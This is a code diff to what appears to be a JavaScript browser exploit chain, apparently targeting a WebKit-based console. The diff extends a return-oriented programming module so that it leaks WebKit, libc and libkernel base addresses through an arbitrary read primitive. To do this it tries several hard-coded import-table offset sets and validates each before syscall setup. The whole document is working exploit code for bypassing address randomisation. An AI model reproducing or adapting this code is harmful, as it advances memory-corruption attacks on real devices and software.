@@ -247,18 +247,78 @@ const rop = {
     logger.debug(`m_function: ${m_function}`);
 
     webkit_base = m_function.sub(impl.wk_expm1_builtin);
-    logger.debug(`webkit_base: ${webkit_base}`);
+    logger.info(`webkit_base: ${webkit_base}`);
 
-    const strerror_addr = arw.view(webkit_base).getBInt(impl.wk___imp_strerror, true);
-    logger.debug(`strerror_addr: ${strerror_addr}`);
+    const resolve_family = (strerror_slot, error_slot, close_slot, close_export) => {
+      const strerror_addr = arw.view(webkit_base).getBInt(strerror_slot, true);
+      const _error_addr = arw.view(webkit_base).getBInt(error_slot, true);
 
-    const _error_addr = arw.view(webkit_base).getBInt(impl.wk___imp___error, true);
-    logger.debug(`_error_addr: ${_error_addr}`);
+      if (strerror_addr.eq(0) || _error_addr.eq(0)) {
+        return undefined;
+      }
 
-    libc_base = strerror_addr.sub(impl.lc_strerror);
+      let libc;
+      let libkernel;
+
+      try {
+        libc = strerror_addr.sub(impl.lc_strerror);
+        libkernel = _error_addr.sub(impl.lk__error);
+      } catch (e) {
+        return undefined;
+      }
+
+      if ((libc.lo & 0xfff) !== 0 || (libkernel.lo & 0xfff) !== 0) {
+        return undefined;
+      }
+
+      if (close_slot !== undefined) {
+        const close_addr = arw.view(webkit_base).getBInt(close_slot, true);
+
+        if (close_addr.eq(0)) {
+          return undefined;
+        }
+
+        try {
+          if (!close_addr.sub(close_export).eq(libkernel)) {
+            return undefined;
+          }
+        } catch (e) {
+          return undefined;
+        }
+      }
+
+      return { strerror_addr, _error_addr, libc, libkernel };
+    };
+
+    const families = [
+      { strerror: impl.wk___imp_strerror, error: impl.wk___imp___error },
+      { strerror: 0x3352250, error: 0x3352230, close: 0x3352228, close_export: 0x274e0 },
+      { strerror: 0x334e250, error: 0x334e230, close: 0x334e228, close_export: 0x274e0 },
+    ];
+
+    let resolved = undefined;
+
+    for (const family of families) {
+      resolved = resolve_family(family.strerror, family.error, family.close, family.close_export);
+
+      if (resolved !== undefined) {
+        logger.info(`GOT family ${family.strerror.toString(16)} validated`);
+        break;
+      }
+    }
+
+    if (resolved === undefined) {
+      throw new Error('Unable to resolve libc/libkernel bases !!');
+    }
+
+    const strerror_addr = resolved.strerror_addr;
+    const _error_addr = resolved._error_addr;
+    libc_base = resolved.libc;
+    libkernel_base = resolved.libkernel;
+
+    logger.info(`strerror addr: ${strerror_addr}`);
+    logger.info(`_error addr: ${_error_addr}`);
     logger.info(`libc base: ${libc_base}`);
-
-    libkernel_base = _error_addr.sub(impl.lk__error);
     logger.info(`libkernel base: ${libkernel_base}`);
 
     init_syscalls();
